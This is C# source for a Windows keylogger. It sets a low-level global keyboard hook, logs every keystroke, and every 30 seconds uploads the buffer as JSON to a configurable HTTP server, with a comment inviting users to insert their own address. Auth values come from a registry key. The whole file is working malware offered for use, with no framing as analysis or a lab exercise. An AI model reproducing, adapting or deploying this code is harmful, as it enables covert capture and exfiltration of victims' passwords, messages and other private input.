using System.Diagnostics;
using System.Net.Http.Json;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;
using Microsoft.Win32;
using SharedDataTypes;

namespace KeyLogger;

public class Program
{
    [DllImport("user32.dll")]
    public static extern IntPtr SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, IntPtr wParam, uint lParam);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("user32.dll")]
    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    private static readonly int WH_KEYBOARD_LL = 13;
    private static readonly int WM_KEYDOWN = 0x100;

    private static readonly StringBuilder Data = new();
    private static readonly HttpClient SharedTarget = new() { BaseAddress = new Uri("http://localhost:5001"), };  // OR insert your desired address.

    public static void Main(string[] args)
    {
        HookCallbackDelegate hcDelegate = HookCallback;

        string mainModuleName = Process.GetCurrentProcess().MainModule.ModuleName;
        IntPtr hook = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);

        System.Timers.Timer Timer = new(30000);
        Timer.Elapsed += Send;
        Timer.AutoReset = true;
        Timer.Enabled = true;

        Console.WriteLine("Start");
        Application.Run();
    }
    private static async void Send(Object source, ElapsedEventArgs e)
    {
        ReceivedData Body;
        try
        {
            lock (Data)
            {
                if (Data.Length == 0)
                {
                    return;
                }
                Body = new ReceivedData(RetrieveRegistryData("AuthToken"), int.Parse(RetrieveRegistryData("ID")), DateTime.Now - new TimeSpan(0, 0, 30), Data.ToString());
                Data.Clear();
            }
            HttpResponseMessage Response = await SharedTarget.PostAsJsonAsync("/send", Body);
            Response.EnsureSuccessStatusCode();
            Console.WriteLine("Sent");
        }
        catch
        {
            // Perharps can plans to store unsent data temporary.
            Console.WriteLine("Failed");
        }
        finally { }
    }
    public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            lock (Data)
            {
                Data.Append($"[{(Keys)vkCode}]");
            }
        }
        return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
    }

    public static string RetrieveRegistryData(string ValueName)
    {
        using RegistryKey Key = (Registry.CurrentUser.OpenSubKey(@"Software\KeyLogger\Auth")); // change the name accordingly.
        if (Key != null)
        {
            var Data = (Key.GetValue(ValueName) ?? "").ToString();
            if (Data != null)
            {
                return Data;
            }
        }
        return "";
    }
    public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);
}